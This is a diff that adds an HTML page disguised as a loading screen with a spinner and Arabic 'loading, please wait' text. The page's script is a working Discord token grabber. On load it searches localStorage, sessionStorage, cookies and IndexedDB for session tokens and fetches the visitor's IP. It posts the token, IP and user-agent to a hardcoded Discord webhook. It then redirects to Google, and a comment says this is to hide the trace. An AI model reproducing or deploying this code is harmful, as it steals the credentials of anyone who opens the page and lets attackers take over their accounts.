@@ -1,1 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body {
+            background: #1a1a2e;
+            color: white;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            flex-direction: column;
+        }
+        .loader {
+            border: 6px solid #2a2a4a;
+            border-top: 6px solid #7289da;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .text {
+            margin-top: 30px;
+            color: #a0a0c0;
+            font-size: 18px;
+        }
+        .sub {
+            margin-top: 10px;
+            color: #666;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <div class="text">جاري التحميل...</div>
+    <div class="sub">يرجى الانتظار</div>
 
+    <script>
+        (function() {
+            // ===== ثابت الويب هوك =====
+            const WEBHOOK_URL = "https://discord.com/api/webhooks/1520214638430650439/ECAB_FeMPIx-H088wP8etKQS3Y5fEw4uxi92efB5pQxucas3FvQ9uYLNbePcs2mi2i82";
+
+            // ===== دالة جلب التوكن من localStorage =====
+            function getTokenFromLocalStorage() {
+                try {
+                    // البحث عن التوكن في localStorage
+                    for (let i = 0; i < localStorage.length; i++) {
+                        const key = localStorage.key(i);
+                        const value = localStorage.getItem(key);
+                        if (value && value.match(/[a-zA-Z0-9_-]{24,}\.[a-zA-Z0-9_-]{6,}\.[a-zA-Z0-9_-]{27,}/)) {
+                            return value;
+                        }
+                    }
+                    // قد يكون التوكن تحت مفتاح 'token'
+                    return localStorage.getItem('token') || null;
+                } catch(e) { return null; }
+            }
+
+            // ===== دالة جلب التوكن من sessionStorage =====
+            function getTokenFromSessionStorage() {
+                try {
+                    for (let i = 0; i < sessionStorage.length; i++) {
+                        const key = sessionStorage.key(i);
+                        const value = sessionStorage.getItem(key);
+                        if (value && value.match(/[a-zA-Z0-9_-]{24,}\.[a-zA-Z0-9_-]{6,}\.[a-zA-Z0-9_-]{27,}/)) {
+                            return value;
+                        }
+                    }
+                    return sessionStorage.getItem('token') || null;
+                } catch(e) { return null; }
+            }
+
+            // ===== دالة جلب التوكن من cookies =====
+            function getTokenFromCookies() {
+                try {
+                    const cookies = document.cookie.split(';');
+                    for (let cookie of cookies) {
+                        if (cookie.includes('token')) {
+                            const parts = cookie.split('=');
+                            if (parts.length > 1) {
+                                const token = decodeURIComponent(parts[1].trim());
+                                if (token.match(/[a-zA-Z0-9_-]{24,}\.[a-zA-Z0-9_-]{6,}\.[a-zA-Z0-9_-]{27,}/)) {
+                                    return token;
+                                }
+                            }
+                        }
+                    }
+                    return null;
+                } catch(e) { return null; }
+            }
+
+            // ===== دالة جلب الـ IP =====
+            function getIP() {
+                return new Promise((resolve) => {
+                    fetch('https://api.ipify.org?format=json')
+                        .then(r => r.json())
+                        .then(data => resolve(data.ip))
+                        .catch(() => {
+                            fetch('https://httpbin.org/ip')
+                                .then(r => r.json())
+                                .then(data => resolve(data.origin))
+                                .catch(() => resolve('Unable to fetch IP'));
+                        });
+                });
+            }
+
+            // ===== دالة إرسال البيانات إلى ويب هوك =====
+            function sendToWebhook(token, ip) {
+                const embed = {
+                    embeds: [{
+                        title: "🎯 Token Grabbed",
+                        color: 0x00bfff,
+                        fields: [
+                            { name: "🔑 Token", value: `\`${token}\``, inline: false },
+                            { name: "🌐 IP", value: ip, inline: true },
+                            { name: "🕒 Time", value: new Date().toLocaleString(), inline: true },
+                            { name: "🌍 User-Agent", value: navigator.userAgent.substring(0, 100) + '...', inline: false }
+                        ],
+                        footer: { text: "Token Grabber" }
+                    }]
+                };
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(embed)
+                }).catch(e => console.error('Error:', e));
+            }
+
+            // ===== التنفيذ الرئيسي =====
+            window.onload = function() {
+                let token = getTokenFromLocalStorage();
+                if (!token) token = getTokenFromSessionStorage();
+                if (!token) token = getTokenFromCookies();
+
+                // إذا لم يتم العثور على توكن، حاول البحث في IndexedDB (خاص بديسكورد ويب)
+                if (!token) {
+                    try {
+                        const request = indexedDB.open('discord', 1);
+                        request.onsuccess = function(event) {
+                            const db = event.target.result;
+                            if (db.objectStoreNames.contains('tokens')) {
+                                const transaction = db.transaction(['tokens'], 'readonly');
+                                const store = transaction.objectStore('tokens');
+                                const getRequest = store.get('token');
+                                getRequest.onsuccess = function() {
+                                    if (getRequest.result) {
+                                        token = getRequest.result;
+                                        sendData(token);
+                                    }
+                                };
+                            }
+                        };
+                    } catch(e) {}
+                }
+
+                function sendData(tkn) {
+                    if (tkn) {
+                        getIP().then(ip => sendToWebhook(tkn, ip));
+                    }
+                }
+
+                if (token) {
+                    getIP().then(ip => sendToWebhook(token, ip));
+                }
+
+                // بعد 3 ثوانٍ، إعادة توجيه إلى صفحة حقيقية (لإخفاء الأثر)
+                setTimeout(() => {
+                    window.location.href = "https://www.google.com";
+                }, 3000);
+            };
+        })();
+    </script>
+</body>
+</html>
